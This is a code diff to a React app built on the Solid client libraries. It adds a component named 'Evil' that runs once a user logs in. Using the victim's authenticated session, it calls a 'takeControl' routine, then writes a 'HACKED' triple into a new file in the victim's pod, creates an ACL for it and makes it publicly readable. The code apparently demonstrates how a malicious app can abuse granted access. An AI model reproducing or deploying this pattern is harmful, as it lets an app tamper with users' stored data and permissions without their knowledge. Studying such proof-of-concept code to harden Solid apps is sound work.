@@ -1,5 +1,6 @@
+import { access, addUrl, createSolidDataset, createThing, saveSolidDatasetAt, setThing, setUrl } from '@inrupt/solid-client';
 import { fetch, handleIncomingRedirect, login } from '@inrupt/solid-client-authn-browser';
-import { acl } from 'rdf-namespaces';
+import { acl, rdf as rdfns } from 'rdf-namespaces';
 import * as rdf from 'rdflib';
 import React, { useEffect, useState } from 'react';
 import './App.css';
@@ -49,14 +50,50 @@ const Login = () => {
 }
 
 const Evil = ({user}: { user: string}) => {
+  const [file, setFile] = useState('')
   useEffect(() => {
-    takeControl(user).then(() => console.log('took over'))
+    (async () => {
+      await takeControl(user)
+      console.log('took over')
+      const uri = await createRandomPublicDocument(user)
+      console.log('created a public document', uri)
+      setFile(uri)
+    })()
   }, [user])
-  return <><a href={user}>your profile</a></>
+  return <>
+  <a href={user}>your profile</a>
+  <br />
+  {file && 'Finished!'}
+  <br />
+  {file && <a href={file}>Check out your new public document</a>}
+  </>
 }
 
 const createRandomPublicDocument = async (person: string) => {
+    const baseUrl = /^(https?:\/\/.*)\/profile\/card#me$/g.exec(person)?.[1]
+    if (!baseUrl) throw new Error('unable to generate baseUrl from webId')
+    const page = baseUrl + '/some-public-page.ttl'
+    let dataset = createSolidDataset()
+    let me = createThing({ url: person })
+    me = setUrl(me, 'https://example.com#got', 'https://example.com#HACKED')
+    dataset = setThing(dataset, me)
+    await saveSolidDatasetAt(page, dataset, {fetch})
 
+    let myacl = createThing({ url: page + '.acl#owner' })
+    myacl = setUrl(myacl,rdfns.type, acl.Authorization)
+    myacl = setUrl(myacl,acl.agent, person)
+    myacl = setUrl(myacl, acl.accessTo, page)
+    myacl = addUrl(myacl, acl.mode, acl.Read)
+    myacl = addUrl(myacl, acl.mode, acl.Write)
+    myacl = addUrl(myacl, acl.mode, acl.Control)
+    let aclDataset = createSolidDataset()
+    aclDataset = setThing(aclDataset, myacl)
+
+    await saveSolidDatasetAt(page + '.acl', aclDataset, {fetch})
+
+    console.log(await access.setPublicAccess(page, { read: true}, {fetch}))
+
+    return page
 }
 
 const takeControl = async (user: string) => {
